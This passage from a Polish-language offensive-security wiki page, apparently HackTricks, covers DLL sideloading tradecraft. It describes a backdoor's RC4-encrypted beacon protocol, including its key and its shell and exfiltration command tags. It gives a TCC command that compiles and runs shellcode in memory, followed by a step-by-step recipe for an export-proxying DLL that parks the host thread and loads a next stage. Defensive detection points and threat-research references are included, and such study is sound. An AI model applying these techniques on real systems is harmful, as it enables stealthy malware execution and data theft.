- Beacony tworzą profil hosta rozdzielany kropkami, dodają na początku tag `4Q`, a następnie szyfrują go RC4 kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane przez RC4 i kierowane za pomocą przełącznika tagów (`4T` shell, `4V` uruchamianie procesu, `4W/4X` zapis pliku, `4Y` odczyt/eksfiltracja, `4\\` odinstalowanie, `4` wyliczanie dysków/plików + przypadki transferu porcjami).
- Tryb działania zależy od argumentów CLI: brak argumentów = instalacja mechanizmu utrwalania (usługa/klucz Run) wskazującego na `-i`; `-i` ponownie uruchamia sam siebie z `-k`; `-k` pomija instalację i uruchamia payload.

Zaobserwowany alternatywny loader
- Ta sama intruzja umieściła Tiny C Compiler i uruchomiła `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z plikiem `libtcc.dll` obok. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który został skompilowany i uruchomiony w pamięci bez zapisywania pliku PE na dysku. Odtwórz to za pomocą:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- Ten etap kompilacji i uruchomienia oparty na TCC importował `Wininet.dll` w czasie działania i pobierał second-stage shellcode z zahardkodowanego URL-a, zapewniając elastyczny loader podszywający się pod uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **mechanizmy zapewniające stabilność**, dzięki którym legalny host pozostaje aktywny wystarczająco długo, aby poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej DLL.<sup>[[11]](#references)</sup>

Zaobserwowany wzorzec
- Umieść zaufany plik EXE obok złośliwej DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa DLL **proxy’uje każdy oczekiwany export** do prawdziwej systemowej DLL (na przykład `%SystemRoot%\\System32\\version.dll`), aby rozwiązywanie importów nadal działało, a proces hosta mógł funkcjonować.
- Po załadowaniu złośliwa DLL **patchuje entry point hosta**, tak aby główny wątek trafiał do nieskończonej pętli `Sleep`, zamiast się kończyć lub wykonywać ścieżki kodu, które zakończyłyby proces.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę DLL kolejnego etapu (często używane są RC4/XOR), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego to ma znaczenie
- Standardowe proxy’owanie DLL zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo, by uruchomić kolejne etapy.
- Wstrzymanie głównego wątku w `Sleep(INFINITE)` to prosty sposób, by utrzymać podpisany proces, podczas gdy loader wykonuje deszyfrowanie, staging lub inicjuje połączenie sieciowe w wątku roboczym.
- Polowanie wyłącznie na podejrzane `DllMain` może nie wykryć tego wzorca, jeśli interesujące działania następują po patchowaniu entry pointa hosta i uruchomieniu dodatkowego wątku.

Minimalny przebieg
1. Skopiuj podpisany plik EXE hosta i ustal, którą DLL ładuje z lokalnego katalogu.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą wywołania do legalnej DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku spatchuj entry point hosta lub procedurę startową głównego wątku, aby wykonywał pętlę `Sleep`.
5. Odszyfruj nazwę/konfigurację DLL kolejnego etapu i wywołaj `LoadLibrary` albo wykonaj manual mapping payloadu.

Punkty przydatne w obronie
- Podpisane procesy ładujące `version.dll` lub podobne, często używane biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Patche pamięci w entry poincie procesu krótko po załadowaniu obrazu, zwłaszcza skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej DLL o odszyfrowanej nazwie.
- Proxy DLL z pełnym zestawem exportów umieszczane obok plików wykonywalnych dostawców w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki rozpakowanych archiwów.

## References

- [1] [Red Canary – Analiza informacji o zagrożeniach: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - Podniesienie uprawnień przy użyciu TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware wymierzone w Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL Hijacks spotykają windowsowe narzędzia pomocnicze](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórzy: analiza ewoluujących kampanii podszywania się, dystrybuujących Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: analiza klastrów zagrożeń wymierzonych w rząd państwa Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci przekaźnikowej i mechanizmów działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: dogłębna analiza zestawu narzędzi Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – Łańcuch HTB Bruno ZipSlip → DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich irańskiego APT Screening Serpens z 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybcy i wściekli: działania Nimbus Manticore podczas konfliktu z Iranem](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 wymierza ataki w rządy i infrastrukturę krytyczną Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Odtwarzanie i wykrywanie ataków Windows DLL Search-Order Hijacking za pomocą Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Budowanie bibliotek natywnych za pomocą Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Eksporty natywne za pomocą Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Kolejność wyszukiwania bibliotek DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Format PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Odkrycie wariantu SectopRAT osadzonego w legalnym oprogramowaniu](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Kradzież LIGHTSHOW (część pierwsza)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Operacja FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
- [35] [Kaspersky Securelist – Framework do ładowania .NET oparty na XAML: NetamLoader](https://securelist.com/netamloader/121676)
{{#include ../../../banners/hacktricks-training.md}}
